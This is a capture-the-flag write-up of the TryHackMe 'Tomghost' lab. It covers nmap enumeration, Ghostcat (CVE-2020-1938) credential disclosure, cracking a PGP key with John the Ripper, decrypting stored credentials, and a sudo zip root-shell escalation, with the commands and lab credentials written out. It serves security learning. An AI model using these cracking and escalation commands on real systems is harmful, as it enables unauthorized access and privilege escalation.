# Tomghost
> Silver Garcia - 07/05/2024

## Enumeration
nmap
```bash
sudo nmap -T4 -A -p- 10.10.177.54
Nmap scan report for 10.10.177.54
Host is up (0.15s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/7%OT=22%CT=1%CU=43920%PV=Y%DS=2%DC=T%G=Y%TM=663AE
OS:430%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)S
OS:EQ(SP=104%GCD=2%ISR=108%TI=Z%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7
OS:%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W
OS:2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NN
OS:SNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y
OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G                                                     
OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)                
                                                                
Network Distance: 2 hops                                        
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   195.16 ms 10.8.0.1
2   195.21 ms 10.10.177.54

```

Got credentials using exploit for CVE-2020-1938
Credentials:
```
<description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>
```

## Getting access
Got access with SSH using found credentials.

## Privilege escalation

### skyfuck
Found two files on `/home/skfuck` folder.
```
credential.pgp  tryhackme.asc
```

tryhackme.asc is a PGP private key.


Cracked tryhackme.asc key using John the Ripper.
1. gpg to John
```bash
gpg2john tryhackme.asc 

File tryhackme.asc
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
```
2. Put content on file and cracked it
```
john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt asc-john.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)  
```

With the passphrase, could decrypt `credential.pgp` file:
1. Import private key:
```bash
gpg --import tryhackme.asc
```
2. Decrypt pgp file
```bash
gpg --decrypt credential.pgp
```

Content of credential.pgp
```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```
Got access as merlin user through SSH.

### merlin
Commands that can be run as sudo
```bash
sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

Got root access abusing ZIP runnig as sudo (Got from GTFObins)
```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```